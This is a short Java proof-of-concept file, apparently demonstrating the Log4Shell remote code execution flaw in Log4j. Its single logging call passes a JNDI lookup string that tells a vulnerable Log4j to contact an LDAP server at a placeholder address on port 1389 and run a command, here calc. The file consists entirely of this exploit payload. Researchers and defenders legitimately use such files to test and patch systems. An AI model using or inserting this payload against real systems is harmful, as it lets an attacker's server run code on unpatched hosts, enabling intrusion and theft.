import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;


public class log4jRCE {
    private static final Logger logger = LogManager.getLogger(log4jRCE.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://ip:1389/Basic/Command/calc}");
    }
}
